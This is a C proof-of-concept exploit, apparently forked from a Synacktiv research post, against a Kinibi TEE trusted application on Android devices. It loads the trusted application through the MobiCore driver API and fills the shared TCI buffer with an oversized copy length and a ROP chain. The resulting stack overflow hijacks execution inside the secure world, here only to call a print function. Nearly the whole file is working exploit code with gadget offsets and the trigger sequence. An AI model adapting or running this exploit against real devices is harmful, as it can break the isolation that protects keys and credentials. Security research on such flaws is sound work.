// forked from https://www.synacktiv.com/posts/exploit/kinibi-tee-trusted-application-exploitation.html

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>

#include "MobiCoreDriverApi.h"

#define err(f_, ...) {printf("[\033[31;1m!\033[0m] "); printf(f_, ##__VA_ARGS__);}
#define ok(f_, ...) {printf("[\033[32;1m+\033[0m] "); printf(f_, ##__VA_ARGS__);}
#define info(f_, ...) {printf("[\033[34;1m-\033[0m] "); printf(f_, ##__VA_ARGS__);}
#define warn(f_, ...) {printf("[\033[33;1mw\033[0m] "); printf(f_, ##__VA_ARGS__);}

int main(int argc, char **argv) {
    mcResult_t ret;
    mcSessionHandle_t session = {0};
    mcBulkMap_t map;
    uint32_t stack_size;
    char *to_map;


    // ROPgadget --binary fffffffff0000000000000000000001b.tlbin \
    //             --rawArch arm --rawMode thumb --offset 0x1000
    uint32_t rop_chain[] = {
        0x38c2 + 1, // pop {r0, r1, r2, r3, r4, r5, r6, pc}
        0x0,        // r0 (will be the string to print)
        0x0,        // r1 (argument, will be set after mcMap)
        0x0,        // r2 (not used)
        0x0,        // r3 (not used)
        0x0,        // r4 (not used)
        0x0,        // r5 (not used)
        0x0,        // r6 (not used)
        0x25070 + 1 // tlApiPrintf wrapper
    };

    FILE *f = fopen(
        "/data/local/tmp/fffffffff0000000000000000000001b.tlbin",
        "rb"
    );
    if(!f) {
        err("Can't open TA %s\n",argv[1]);
        return 1;
    }
    fseek(f, 0, SEEK_END);
    uint32_t ta_size = ftell(f);
    fseek(f, 0, SEEK_SET);


    char *ta_mem = malloc(ta_size);
    if (fread(ta_mem, ta_size, 1, f) != 1) {
        err("Can't read TA");
        return 1;
    }

    uint32_t tciLen = 0x20000; // TA access to fixed offset on this WSM
                               // so the buffer should be large enough
    uint32_t *tci = malloc(tciLen);

    ret = mcOpenDevice(MC_DEVICE_ID_DEFAULT);
    if(ret != MC_DRV_OK) {
        err("Can't mcOpenDevice\n");
        return 1;
    }

    to_map = strdup("--> Hello from the trusted application <--\n");

    ret = mcOpenTrustlet(&session, 0, ta_mem, ta_size, 
                         (uint8_t *)tci, tciLen);
    if(ret == MC_DRV_OK) {
        // map the string in TA virtual space, the API returns
        // the address in the TA space.
        ret = mcMap(&session, to_map, 40960, (mcBulkMap_t *)&map);
        if (ret != MC_DRV_OK) {
            err("Can't map in\n");
            return 1;
        }
        ok("Address in TA virtual memory : 0x%x\n", map.sVirtualAddr);

        // rop_chain[1] is R0, point it to the string in TA 
        // address space.
        rop_chain[1] = map.sVirtualAddr;

        stack_size  = 0x54c; // fill stack frame
        stack_size += 0x20;  // popped registers size

        // fill tciBuffer
        tci[0] = 27;                             // cmd id
        tci[3] = stack_size + sizeof(rop_chain); // memcpy size
        memcpy(&tci[4 + stack_size/4], &rop_chain, sizeof(rop_chain));

        // notify the TA
        mcNotify(&session);
        mcWaitNotification(&session, 2000);
        mcCloseSession(&session);
    }
    mcCloseDevice(MC_DEVICE_ID_DEFAULT);
    return 0;
}